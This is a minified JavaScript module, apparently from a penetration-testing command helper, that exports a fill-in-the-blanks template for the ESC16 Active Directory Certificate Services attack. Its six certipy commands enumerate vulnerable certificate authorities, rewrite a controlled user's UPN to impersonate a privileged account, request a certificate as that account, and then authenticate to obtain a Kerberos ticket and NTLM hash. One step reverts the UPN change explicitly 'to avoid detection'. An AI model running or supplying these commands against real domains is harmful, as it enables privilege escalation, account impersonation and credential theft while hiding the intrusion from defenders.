const e=[{title:"ESC16",description:"ESC16: Security Extension Disabled on CA (Weak Certificate Mapping)",template:`1) Enumerate AD CS and check if ESC16 is present

certipy find -u {service_user}@{domain} -hashes {hash} -vulnerable -stdout

2) Read target service account attributes (check UPN)

certipy account -u {reader_user}@{domain} -hashes {reader_hash} -user {target_user} read

3) Update UPN of controlled user to impersonate privileged account

certipy account -u {modifier_user}@{domain} -hashes {modifier_hash} -user {target_user} -upn {target_impersonate} update

4) Request a certificate as the impersonated account

certipy req -u {target_user} -hashes {target_hash} -dc-ip {dc_ip} -target {dc_host} -ca {ca_name} -template User

5) Revert UPN change to original to avoid detection

certipy account -u {modifier_user}@{domain} -hashes {modifier_hash} -user {target_user} -upn {original_upn} update

6) Authenticate using obtained certificate to get TGT/NTLM

certipy auth -dc-ip {dc_ip} -pfx {pfx_file} -u {target_impersonate} -domain {domain}`}],t={commands:e};export{e as commands,t as default};
